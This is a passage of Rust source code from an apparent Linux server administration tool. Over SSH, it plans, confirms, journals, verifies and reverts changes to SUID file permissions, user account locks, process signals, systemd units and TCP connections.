                if let Err(error) = operation.execute(&self.target, &executor).await {
                    if operation.state() == OperationState::StaleAfterExecution {
                        operation.journal(journal)?;
                    }
                    return Err(error);
                }
                operation.journal(journal)?;
                let verification = match operation.verify(&self.target, &executor, journal).await {
                    Ok(verification) => verification,
                    Err(verification_error) => {
                        return match operation.restore(&self.target, &executor, journal).await {
                            Ok(()) => Err(verification_error),
                            Err(restore_error) => Err(CoreError::validation(
                                "SUID permission verification",
                                format!(
                                    "{verification_error}; automatic restore also failed: {restore_error}"
                                ),
                            )),
                        };
                    }
                };
                if verification.passed {
                    (verification, false)
                } else {
                    operation.restore(&self.target, &executor, journal).await?;
                    (verification, true)
                }
            }
        };
        Ok(ArtifactMutationOutcome {
            row_id,
            action,
            path,
            verification,
            restored_after_failed_verification,
        })
    }

    pub async fn investigate_network(
        &self,
        session: &BoundSshSession,
        request: &NetworkInvestigationRequest,
    ) -> CoreResult<NetworkInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command()?, request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("network investigation", &output));
        }
        let (bounded, truncated) = bounded_network_output(&output.output);
        Ok(NetworkInvestigationResult {
            row_id: request.identity.row_id.clone(),
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn plan_user_account(
        &self,
        session: &BoundSshSession,
        request: &UserAccountRequest,
    ) -> CoreResult<UserAccountPlan> {
        self.target.validate(session.target())?;
        let snapshot = self
            .user_account_snapshot(session, &request.username)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "user account",
                id: request.username.clone(),
            })?;
        validate_user_account_precondition(&snapshot, request.action)?;
        self.target.validate(session.target())?;
        let session_warning = if snapshot.username == snapshot.session_username {
            " 这是当前 SSH 登录账户，操作可能阻止重新连接。"
        } else {
            ""
        };
        let mut operation = OperationPlan::new(
            session.target().clone(),
            format!(
                "{} {}（UID {}，当前密码状态 {}）。执行后将回读账户状态；验证失败时恢复确认前锁定状态。{}",
                request.action.label(),
                snapshot.username,
                snapshot.uid,
                snapshot.password_state.label(),
                session_warning,
            ),
            true,
            Some(format!(
                "恢复用户 {} 的密码锁定状态为 {}。",
                snapshot.username,
                snapshot.password_state.label(),
            )),
        )?;
        operation
            .metadata
            .insert("source".to_owned(), "system-info-user".to_owned());
        operation
            .metadata
            .insert("username".to_owned(), snapshot.username.clone());
        operation
            .metadata
            .insert("uid".to_owned(), snapshot.uid.to_string());
        operation.metadata.insert(
            "action".to_owned(),
            match request.action {
                UserAccountAction::Lock => "lock",
                UserAccountAction::Unlock => "unlock",
            }
            .to_owned(),
        );
        operation.metadata.insert(
            "snapshot-sha256".to_owned(),
            user_account_snapshot_sha256(&snapshot),
        );
        Ok(UserAccountPlan {
            operation,
            row_id: request.row_id.clone(),
            snapshot,
            action: request.action,
        })
    }

    pub async fn execute_user_account(
        &self,
        session: &BoundSshSession,
        plan: UserAccountPlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<UserAccountOutcome> {
        let executor = UserAccountExecutor {
            service: self,
            session,
            plan: &plan,
        };
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = match operation.verify(&self.target, &executor, journal).await {
            Ok(verification) => verification,
            Err(verification_error) => {
                return match operation.restore(&self.target, &executor, journal).await {
                    Ok(()) => Err(verification_error),
                    Err(restore_error) => Err(CoreError::validation(
                        "user account verification",
                        format!(
                            "{verification_error}; automatic restore also failed: {restore_error}"
                        ),
                    )),
                };
            }
        };
        let restored_after_failed_verification = if verification.passed {
            false
        } else {
            operation.restore(&self.target, &executor, journal).await?;
            true
        };
        Ok(UserAccountOutcome {
            username: plan.snapshot.username,
            action: plan.action,
            verification,
            restored_after_failed_verification,
        })
    }

    pub async fn plan_process_signal(
        &self,
        session: &BoundSshSession,
        request: &ProcessSignalRequest,
    ) -> CoreResult<ProcessSignalPlan> {
        self.target.validate(session.target())?;
        let snapshot = self
            .process_identity_snapshot(session, request.pid)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "process",
                id: request.pid.to_string(),
            })?;
        self.target.validate(session.target())?;
        let mut operation = OperationPlan::new(
            session.target().clone(),
            format!(
                "{} PID {}（{}，启动时钟 {}）。此操作不可恢复。",
                request.signal.label(),
                snapshot.pid,
                snapshot.command_name,
                snapshot.start_time_ticks
            ),
            true,
            None,
        )?;
        operation
            .metadata
            .insert("source".to_owned(), "system-info-process".to_owned());
        operation
            .metadata
            .insert("pid".to_owned(), snapshot.pid.to_string());
        operation.metadata.insert(
            "start-time-ticks".to_owned(),
            snapshot.start_time_ticks.to_string(),
        );
        operation
            .metadata
            .insert("signal".to_owned(), request.signal.shell_name().to_owned());
        Ok(ProcessSignalPlan {
            operation,
            row_id: request.row_id.clone(),
            snapshot,
            signal: request.signal,
        })
    }

    pub async fn execute_process_signal(
        &self,
        session: &BoundSshSession,
        plan: ProcessSignalPlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<ProcessSignalOutcome> {
        let executor = ProcessSignalExecutor {
            service: self,
            session,
            plan: &plan,
        };
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = operation.verify(&self.target, &executor, journal).await?;
        Ok(ProcessSignalOutcome {
            pid: plan.snapshot.pid,
            signal: plan.signal,
            verification,
        })
    }

    pub async fn plan_service_runtime(
        &self,
        session: &BoundSshSession,
        request: &ServiceRuntimeRequest,
    ) -> CoreResult<ServiceRuntimePlan> {
        self.target.validate(session.target())?;
        let snapshot = self.service_state_snapshot(session, &request.unit).await?;
        validate_service_runtime_precondition(&snapshot, request.action)?;
        self.target.validate(session.target())?;
        let restore_description = match request.action {
            ServiceRuntimeAction::Enable => Some(format!(
                "若启用状态回读失败，恢复 {} 为 disabled。",
                snapshot.unit
            )),
            ServiceRuntimeAction::Disable => Some(format!(
                "若禁用状态回读失败，恢复 {} 为 enabled。",
                snapshot.unit
            )),
            ServiceRuntimeAction::Mask => Some(format!(
                "若屏蔽状态回读失败，解除屏蔽并恢复 {} 为 {}。",
                snapshot.unit, snapshot.unit_file_state
            )),
            _ => None,
        };
        let recovery_note = if restore_description.is_some() {
            "单元文件状态回读失败时将自动恢复确认前状态。"
        } else {
            "运行状态操作无法自动恢复。"
        };
        let mut operation = OperationPlan::new(
            session.target().clone(),
            format!(
                "{} {}（当前：{} / {}，自启：{}）。执行后将重新读取 systemd 状态验证；{}",
                request.action.label(),
                snapshot.unit,
                snapshot.active_state,
                snapshot.sub_state,
                snapshot.unit_file_state,
                recovery_note,
            ),
            true,
            restore_description,
        )?;
        operation
            .metadata
            .insert("source".to_owned(), "system-info-service".to_owned());
        operation
            .metadata
            .insert("unit".to_owned(), snapshot.unit.clone());
        operation
            .metadata
            .insert("action".to_owned(), request.action.command().to_owned());
        operation.metadata.insert(
            "snapshot-sha256".to_owned(),
            service_snapshot_sha256(&snapshot),
        );
        Ok(ServiceRuntimePlan {
            operation,
            row_id: request.row_id.clone(),
            snapshot,
            action: request.action,
        })
    }

    pub async fn execute_service_runtime(
        &self,
        session: &BoundSshSession,
        plan: ServiceRuntimePlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<ServiceRuntimeOutcome> {
        let executor = ServiceRuntimeExecutor {
            service: self,
            session,
            plan: &plan,
        };
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = match operation.verify(&self.target, &executor, journal).await {
            Ok(verification) => verification,
            Err(verification_error) if plan.operation.restore_description.is_some() => {
                return match operation.restore(&self.target, &executor, journal).await {
                    Ok(()) => Err(verification_error),
                    Err(restore_error) => Err(CoreError::validation(
                        "service runtime verification",
                        format!(
                            "{verification_error}; automatic restore also failed: {restore_error}"
                        ),
                    )),
                };
            }
            Err(error) => return Err(error),
        };
        let restored_after_failed_verification =
            if !verification.passed && plan.operation.restore_description.is_some() {
                operation.restore(&self.target, &executor, journal).await?;
                true
            } else {
                false
            };
        Ok(ServiceRuntimeOutcome {
            unit: plan.snapshot.unit,
            action: plan.action,
            verification,
            restored_after_failed_verification,
        })
    }

    pub async fn plan_network_disconnect(
        &self,
        session: &BoundSshSession,
        request: &NetworkDisconnectRequest,
    ) -> CoreResult<NetworkDisconnectPlan> {
        validate_network_disconnect(&request.identity)?;
        self.target.validate(session.target())?;
        let snapshot = self
            .network_connection_snapshot(session, &request.identity)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "network connection",
                id: format!(
                    "{} -> {}",
                    request.identity.local_display, request.identity.remote_display
                ),
            })?;
        self.target.validate(session.target())?;
        let mut operation = OperationPlan::new(
            session.target().clone(),
            format!(
                "断开 TCP 连接 {} → {}（状态 {}）。该操作不可恢复。",
                snapshot.local_display, snapshot.remote_display, snapshot.state
            ),
            true,
            None,
        )?;
        operation
            .metadata
            .insert("source".to_owned(), "system-info-network".to_owned());
        operation.metadata.insert(
            "connection-sha256".to_owned(),
            network_snapshot_sha256(&snapshot),
        );
        operation
            .metadata
            .insert("action".to_owned(), "disconnect".to_owned());
        Ok(NetworkDisconnectPlan {
            operation,
            identity: request.identity.clone(),
            snapshot,
        })
    }

    pub async fn execute_network_disconnect(
        &self,
        session: &BoundSshSession,
        plan: NetworkDisconnectPlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<NetworkDisconnectOutcome> {
        let executor = NetworkDisconnectExecutor {
            service: self,
            session,
            plan: &plan,
        };
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = operation.verify(&self.target, &executor, journal).await?;
        Ok(NetworkDisconnectOutcome {
            row_id: plan.identity.row_id,
            verification,
        })
    }

    async fn process_identity_snapshot(
        &self,
        session: &BoundSshSession,
        pid: u32,
    ) -> CoreResult<Option<ProcessIdentitySnapshot>> {
        self.target.validate(session.target())?;
        let command = process_identity_command(pid);
        let output = self
            .ssh
            .execute_bound(session, command, Duration::from_secs(10))
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out {
            return Err(command_failed("process identity", &output));
        }
        if output.exit_code == Some(44) || output.output.trim() == "ABSENT" {
            return Ok(None);
        }
        if output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("process identity", &output));
        }
        parse_process_identity(&output.output).map(Some)
    }

    async fn service_state_snapshot(
        &self,
        session: &BoundSshSession,
        unit: &str,
    ) -> CoreResult<ServiceStateSnapshot> {
        if !is_valid_unit_name(unit) {
            return Err(invalid_detail_key("systemd unit name"));
        }
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                service_snapshot_command(unit),
                Duration::from_secs(10),
            )
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("service state snapshot", &output));
        }
        parse_service_snapshot(unit, &output.output)
    }

    async fn suid_file_snapshot(
        &self,
        session: &BoundSshSession,
        path: &RemotePath,
    ) -> CoreResult<SuidFileSnapshot> {
        validated_suid_path(path.as_str())?;
        self.remote_regular_file_snapshot(session, path).await
    }

    async fn remote_regular_file_snapshot(
        &self,
        session: &BoundSshSession,
        path: &RemotePath,
    ) -> CoreResult<SuidFileSnapshot> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                suid_snapshot_command(path),
                Duration::from_secs(30),
            )
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("SUID file snapshot", &output));
        }
        parse_suid_snapshot(path, &output.output)
    }

    async fn user_account_snapshot(
        &self,
        session: &BoundSshSession,
        username: &str,
    ) -> CoreResult<Option<UserAccountSnapshot>> {
        if !is_valid_username(username) {
            return Err(invalid_detail_key("Linux username"));
        }
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                user_account_snapshot_command(username),
                Duration::from_secs(10),
            )
            .await?;
        self.target.validate(session.target())?;
        if output.exit_code == Some(44) || output.output.trim() == "ABSENT" {
            return Ok(None);
        }
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("user account snapshot", &output));
        }
        parse_user_account_snapshot(&output.output).map(Some)
    }

    async fn network_connection_snapshot(
        &self,
        session: &BoundSshSession,
        identity: &NetworkConnectionIdentity,
    ) -> CoreResult<Option<NetworkConnectionSnapshot>> {
        validate_network_disconnect(identity)?;
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                network_snapshot_command(identity),
                Duration::from_secs(10),
            )
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out {
            return Err(command_failed("network connection snapshot", &output));
        }
        if output.exit_code == Some(44) || output.output.trim() == "ABSENT" {
            return Ok(None);
        }
        if output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("network connection snapshot", &output));
        }
        parse_network_snapshot(&output.output).map(Some)
    }
}

#[derive(Debug)]
struct ProcessSignalExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a ProcessSignalPlan,
}

impl ProcessSignalExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "process signal operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for ProcessSignalExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .process_identity_snapshot(self.session, self.plan.snapshot.pid)
            .await?;
        if observed.as_ref() != Some(&self.plan.snapshot) {
            return Err(CoreError::validation(
                "process signal precondition",
                "the process identity changed after confirmation was prepared",
            ));
        }
        self.service.target.validate(&self.plan.operation.target)?;
        let pid = shq(&self.plan.snapshot.pid.to_string());
        let command = format!(
            "p={pid}; kill -s {} -- \"$p\"",
            self.plan.signal.shell_name()
        );
        let dispatch_summary = match self
            .service
            .ssh
            .execute_bound(self.session, command, Duration::from_secs(10))
            .await
        {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        };
        Ok(ExecutionReceipt {
            summary: format!(
                "{} dispatch to PID {} with start time {}: {dispatch_summary}",
                self.plan.signal.shell_name(),
                self.plan.snapshot.pid,
                self.plan.snapshot.start_time_ticks
            ),
            restore_token: None,
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let mut observed = self
            .service
            .process_identity_snapshot(self.session, self.plan.snapshot.pid)
            .await?;
        for _ in 0..20 {
            if observed.as_ref() != Some(&self.plan.snapshot) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
            observed = self
                .service
                .process_identity_snapshot(self.session, self.plan.snapshot.pid)
                .await?;
        }
        let passed = observed.as_ref() != Some(&self.plan.snapshot);
        Ok(VerificationResult {
            passed,
            detail: if passed {
                format!(
                    "PID {} no longer has the confirmed start identity",
                    self.plan.snapshot.pid
                )
            } else {
                format!(
                    "PID {} still has the confirmed start identity",
                    self.plan.snapshot.pid
                )
            },
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        Err(CoreError::validation(
            "process signal restore",
            "process signals cannot be reversed",
        ))
    }
}

#[derive(Debug)]
struct ServiceRuntimeExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a ServiceRuntimePlan,
}

impl ServiceRuntimeExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "service runtime operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for ServiceRuntimeExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .service_state_snapshot(self.session, &self.plan.snapshot.unit)
            .await?;
        if observed != self.plan.snapshot {
            return Err(CoreError::validation(
                "service runtime precondition",
                "the systemd unit state changed after confirmation was prepared",
            ));
        }
        validate_service_runtime_precondition(&observed, self.plan.action)?;
        self.service.target.validate(&self.plan.operation.target)?;
        let unit = shq(&self.plan.snapshot.unit);
        let command = format!(
            "n={unit}; systemctl {} -- \"$n\"",
            self.plan.action.command()
        );
        let dispatch_summary = match self
            .service
            .ssh
            .execute_bound(self.session, command, Duration::from_secs(30))
            .await
        {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        };
        Ok(ExecutionReceipt {
            summary: format!(
                "systemctl {} {} from snapshot {}: {dispatch_summary}",
                self.plan.action.command(),
                self.plan.snapshot.unit,
                service_snapshot_sha256(&self.plan.snapshot),
            ),
            restore_token: None,
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let mut observed = self
            .service
            .service_state_snapshot(self.session, &self.plan.snapshot.unit)
            .await?;
        for _ in 0..20 {
            if service_runtime_verified(&observed, self.plan.action) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
            observed = self
                .service
                .service_state_snapshot(self.session, &self.plan.snapshot.unit)
                .await?;
        }
        let passed = service_runtime_verified(&observed, self.plan.action);
        Ok(VerificationResult {
            passed,
            detail: format!(
                "{} is {} / {} with unit-file state {} after systemctl {}{}",
                observed.unit,
                observed.active_state,
                observed.sub_state,
                observed.unit_file_state,
                self.plan.action.command(),
                if passed {
                    " (verified)"
                } else {
                    " (not verified)"
                },
            ),
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        let (command, applied_state, expected_state) = match self.plan.action {
            ServiceRuntimeAction::Enable => ("disable", "enabled", "disabled"),
            ServiceRuntimeAction::Disable => ("enable", "disabled", "enabled"),
            ServiceRuntimeAction::Mask => (
                "unmask",
                "masked",
                self.plan.snapshot.unit_file_state.as_str(),
            ),
            _ => {
                return Err(CoreError::validation(
                    "service runtime restore",
                    "runtime service state changes cannot be reversed automatically",
                ));
            }
        };
        let observed = self
            .service
            .service_state_snapshot(self.session, &self.plan.snapshot.unit)
            .await?;
        if observed.load_state != "loaded" {
            return Err(CoreError::validation(
                "service runtime restore",
                "the systemd unit is no longer loaded",
            ));
        }
        if observed.unit_file_state == expected_state {
            return Ok(());
        }
        if observed.unit_file_state != applied_state {
            return Err(CoreError::validation(
                "service runtime restore",
                format!(
                    "refusing to overwrite unexpected unit-file state {}",
                    observed.unit_file_state
                ),
            ));
        }
        let unit = shq(&self.plan.snapshot.unit);
        let output = self
            .service
            .ssh
            .execute_bound(
                self.session,
                format!("n={unit}; systemctl {command} -- \"$n\""),
                Duration::from_secs(30),
            )
            .await?;
        if output.timed_out || output.exit_code != Some(0) {
            return Err(command_failed("service runtime restore", &output));
        }
        let restored = self
            .service
            .service_state_snapshot(self.session, &self.plan.snapshot.unit)
            .await?;
        if restored.unit_file_state != expected_state {
            return Err(CoreError::validation(
                "service runtime restore",
                format!(
                    "expected unit-file state {expected_state}, observed {}",
                    restored.unit_file_state
                ),
            ));
        }
        Ok(())
    }
}

#[derive(Debug, Eq, PartialEq, Serialize, Deserialize)]
struct SuidPermissionRestoreToken {
    path: RemotePath,
    backup_path: RemotePath,
    sha256: String,
    original_mode: u32,
    target_mode: u32,
    device: u64,
    inode: u64,
}

#[derive(Debug)]
struct SuidPermissionExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a SuidPermissionPlan,
}

impl SuidPermissionExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "SUID permission operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }

    fn token(&self) -> SuidPermissionRestoreToken {
        SuidPermissionRestoreToken {
            path: self.plan.snapshot.path.clone(),
            backup_path: self.plan.backup_path.clone(),
            sha256: self.plan.snapshot.sha256.clone(),
            original_mode: self.plan.snapshot.mode,
            target_mode: self.plan.target_mode,
            device: self.plan.snapshot.device,
            inode: self.plan.snapshot.inode,
        }
    }
}

#[async_trait]
impl OperationExecutor for SuidPermissionExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .suid_file_snapshot(self.session, &self.plan.snapshot.path)
            .await?;
        if observed != self.plan.snapshot {
            return Err(CoreError::validation(
                "SUID permission precondition",
                "file content, metadata, device, or inode changed after confirmation was prepared",
            ));
        }
        let command = suid_permission_apply_command(self.plan);
        let dispatch_summary = match self
            .service
            .ssh
            .execute_bound(self.session, command, Duration::from_secs(120))
            .await
        {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        };
        let restore_token =
            serde_json::to_string(&self.token()).map_err(|source| CoreError::Encode {
                subject: "SUID permission restore token",
                source,
            })?;
        Ok(ExecutionReceipt {
            summary: format!(
                "permission update {} -> {:04o} with managed backup {}: {dispatch_summary}",
                self.plan.snapshot.path.as_str(),
                self.plan.target_mode,
                self.plan.backup_path.as_str(),
            ),
            restore_token: Some(restore_token),
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let token = decode_suid_restore_token(receipt)?;
        if token != self.token() {
            return Err(CoreError::validation(
                "SUID permission verification",
                "restore token does not match the immutable plan",
            ));
        }
        let current = self
            .service
            .remote_regular_file_snapshot(self.session, &token.path)
            .await?;
        let backup = self
            .service
            .remote_regular_file_snapshot(self.session, &token.backup_path)
            .await?;
        let current_matches = current.sha256 == token.sha256
            && current.mode == token.target_mode
            && current.device == token.device
            && current.inode == token.inode;
        let backup_matches = backup.sha256 == token.sha256
            && backup.mode == token.original_mode
            && backup.uid == self.plan.snapshot.uid
            && backup.gid == self.plan.snapshot.gid;
        Ok(VerificationResult {
            passed: current_matches && backup_matches,
            detail: format!(
                "original mode {:04o}, managed backup SHA-256 {}, identity {}:{}",
                current.mode, backup.sha256, current.device, current.inode
            ),
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        let token = decode_suid_restore_token(receipt)?;
        if token != self.token() {
            return Err(CoreError::validation(
                "SUID permission restore",
                "restore token does not match the immutable plan",
            ));
        }
        let current = self
            .service
            .remote_regular_file_snapshot(self.session, &token.path)
            .await?;
        if current.sha256 == token.sha256
            && current.mode == token.original_mode
            && current.device == token.device
            && current.inode == token.inode
        {
            return Ok(());
        }
        if current.sha256 != token.sha256
            || current.mode != token.target_mode
            || current.device != token.device
            || current.inode != token.inode
        {
            return Err(CoreError::validation(
                "SUID permission restore",
                "refuses to modify a file whose content, mode, device, or inode changed after execution",
            ));
        }
        let backup = self
            .service
            .remote_regular_file_snapshot(self.session, &token.backup_path)
            .await?;
        if backup.sha256 != token.sha256 || backup.mode != token.original_mode {
            return Err(CoreError::validation(
                "SUID permission restore",
                "managed backup no longer matches the confirmed snapshot",
            ));
        }
        let output = self
            .service
            .ssh
            .execute_bound(
                self.session,
                suid_permission_restore_command(&token),
                Duration::from_secs(30),
            )
            .await?;
        if output.timed_out || output.exit_code != Some(0) {
            return Err(command_failed("SUID permission restore", &output));
        }
        let restored = self
            .service
            .suid_file_snapshot(self.session, &token.path)
            .await?;
        if restored.sha256 != token.sha256
            || restored.mode != token.original_mode
            || restored.device != token.device
            || restored.inode != token.inode
        {
            return Err(CoreError::validation(
                "SUID permission restore",
                "restored file did not match the confirmed content, mode, device, and inode",
            ));
        }
        Ok(())
    }
}

fn decode_suid_restore_token(receipt: &ExecutionReceipt) -> CoreResult<SuidPermissionRestoreToken> {
    let encoded = receipt
        .restore_token
        .as_deref()
        .ok_or_else(|| CoreError::validation("SUID permission restore", "missing restore token"))?;
    serde_json::from_str(encoded).map_err(|source| CoreError::Decode {
        subject: "SUID permission restore token",
        source,
    })
}

fn suid_permission_apply_command(plan: &SuidPermissionPlan) -> String {
    let snapshot = &plan.snapshot;
    format!(
        "set -eu; p={}; d={}; b={}; expected={}; mode={}; uid={}; gid={}; dev={}; ino={}; target={}; [ -f \"$p\" ] && [ ! -L \"$p\" ] || exit 44; exec 9<\"$p\"; actual=$(sha256sum /proc/self/fd/9 | awk '{{print $1}}'); current=$(stat -Lc '%a:%u:%g:%d:%i' /proc/self/fd/9); [ \"$actual\" = \"$expected\" ] && [ \"$current\" = \"$mode:$uid:$gid:$dev:$ino\" ] || exit 42; umask 077; if [ -e \"$d\" ]; then [ -d \"$d\" ] && [ ! -L \"$d\" ] || exit 43; else install -d -m 700 -- \"$d\"; fi; [ ! -e \"$b\" ] || exit 43; cp -aL -- /proc/self/fd/9 \"$b\"; [ \"$(sha256sum -- \"$b\" | awk '{{print $1}}')\" = \"$expected\" ] || {{ rm -f -- \"$b\"; exit 45; }}; chmod \"$target\" -- /proc/self/fd/9; printf 'APPLIED\\n'",
        shq(snapshot.path.as_str()),
        shq(plan.backup_directory.as_str()),
        shq(plan.backup_path.as_str()),
        shq(&snapshot.sha256),
        shq(&format!("{:o}", snapshot.mode)),
        shq(&snapshot.uid.to_string()),
        shq(&snapshot.gid.to_string()),
        shq(&snapshot.device.to_string()),
        shq(&snapshot.inode.to_string()),
        shq(&format!("{:o}", plan.target_mode)),
    )
}

fn suid_permission_restore_command(token: &SuidPermissionRestoreToken) -> String {
    format!(
        "set -eu; p={}; b={}; expected={}; target={}; original={}; dev={}; ino={}; [ -f \"$p\" ] && [ ! -L \"$p\" ] && [ -f \"$b\" ] && [ ! -L \"$b\" ] || exit 44; exec 9<\"$p\"; [ \"$(sha256sum /proc/self/fd/9 | awk '{{print $1}}')\" = \"$expected\" ] || exit 42; [ \"$(sha256sum -- \"$b\" | awk '{{print $1}}')\" = \"$expected\" ] || exit 42; [ \"$(stat -Lc '%a:%d:%i' /proc/self/fd/9)\" = \"$target:$dev:$ino\" ] || exit 42; chmod \"$original\" -- /proc/self/fd/9",
        shq(token.path.as_str()),
        shq(token.backup_path.as_str()),
        shq(&token.sha256),
        shq(&format!("{:o}", token.target_mode)),
        shq(&format!("{:o}", token.original_mode)),
        shq(&token.device.to_string()),
        shq(&token.inode.to_string()),
    )
}

#[derive(Debug)]
struct UserAccountExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a UserAccountPlan,
}

impl UserAccountExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "user account operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for UserAccountExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .user_account_snapshot(self.session, &self.plan.snapshot.username)
            .await?;
        if observed.as_ref() != Some(&self.plan.snapshot) {
            return Err(CoreError::validation(
                "user account precondition",
                "the account identity or lock state changed after confirmation was prepared",
            ));
        }
        validate_user_account_precondition(&self.plan.snapshot, self.plan.action)?;
        self.service.target.validate(&self.plan.operation.target)?;
        let dispatch_summary = match self
            .service
            .ssh
            .execute_bound(
                self.session,
                user_account_command(&self.plan.snapshot.username, self.plan.action),
                Duration::from_secs(20),
            )
            .await
        {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        };
